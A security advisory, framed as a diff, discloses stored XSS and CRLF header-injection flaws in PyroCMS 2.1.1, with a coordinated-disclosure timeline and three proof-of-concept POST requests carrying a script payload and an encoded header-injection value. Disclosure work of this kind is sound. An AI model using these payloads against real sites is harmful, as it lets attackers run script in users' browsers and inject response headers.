@@ -1,0 +1,79 @@
+PyroCMS 2.1.1 CRLF Injection And Stored XSS Vulnerability
+
+
+Vendor: HappyNinjas Ltd
+Product web page: http://www.pyrocms.com
+Affected version: 2.1.1 (Community)
+
+Summary: PyroCMS is a CMS built using the CodeIgniter PHP framework.
+Using an MVC architecture it was built with modularity in mind. Lightweight,
+themeable and dynamic.
+
+Desc: PyroCMS suffers from a stored XSS and HTTP Response Splitting
+vulnerability when parsing user input to the 'title' and 'redirect_to'
+parameters via POST method thru 'index.php' script. Attackers can exploit
+these weaknesses to execute arbitrary HTML and script code in a user's
+browser session or insert arbitrary HTTP headers, which are included in
+a response sent to the user.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.21
+           PHP 5.3.8
+           MySQL 5.5.20
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+[20.05.2012] Vulnerabilities discovered.
+[20.05.2012] Initial contact with the vendor.
+[20.05.2012] Vendor responds asking more details.
+[20.05.2012] Sent detailed information to the vendor.
+[21.05.2012] Vendor confirms the issues.
+[22.05.2012] Asked vendor for status update.
+[27.05.2012] Vendor replies.
+[03.06.2012] Vendor releases version 2.1.2 to address these issues.
+[04.06.2012] Coordinated public security advisory released.
+
+
+Advisory ID: ZSL-2012-5092
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5092.php
+
+Vendor Advisory: http://www.pyrocms.com/store/details/pyrocms_professional
+
+
+20.05.2012
+
+
+----
+
+
+#1
+
+ - POST http://localhost/pyrocms/index.php/admin/blog/categories/create_ajax HTTP/1.1
+
+   csrf_hash_name   28b57b25dd24b3adb785de7fd863b6be
+   title            "><script>alert(1);</script>
+
+
+#2
+
+ - POST http://localhost/pyrocms/index.php/users/login HTTP/1.1
+
+   btnLogin      Login
+   email         lab@zeroscience.mk
+   password
+   redirect_to   %0D%0A%20ZSL%2DCustom%2DHeader%3Alove_injection
+   remember      1
+
+
+#2a
+
+ - POST http://localhost/pyrocms/index.php/comments/create/pages/4 HTTP/1.1
+
+   comment          t00t%20w00t!
+   d0ntf1llth1s1n
+   redirect_to      %0D%0A%20ZSL%2DCustom%2DHeader%3Alove_injection
+   submit           Comment
